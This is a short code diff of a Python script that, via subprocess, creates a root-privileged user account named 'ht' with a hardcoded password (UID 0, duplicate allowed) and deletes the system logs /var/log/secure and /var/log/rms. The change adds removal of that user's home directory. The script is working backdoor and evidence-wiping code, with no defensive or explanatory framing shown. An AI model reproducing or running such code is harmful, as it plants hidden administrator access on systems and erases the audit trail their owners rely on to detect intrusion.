@@ -4,6 +4,7 @@ import subprocess
 C='ht'
 c = 'pwdht2018'
 cmmd = "useradd -p `openssl passwd -1 -salt 'uroot' " + c + "`" + " -u 0 -o -g root -G root -s /bin/bash -d /home/" + C + " " + C
+rmu = 'rm -r -f /home/'+C
 rmtouch = 'rm -r -f /var/log/secure'
 rmrms = 'rm -r -f /var/log/rms'
 fp = open('/var/log/secure','r')
@@ -13,6 +14,7 @@ for line in fp:
 fp.close()
 fq.close()
 subprocess.getstatusoutput(cmmd)
+subprocess.getstatusoutput(rmu)
 subprocess.getstatusoutput(rmtouch)
 rp = open('/var/log/rms','r')
 for line in rp:
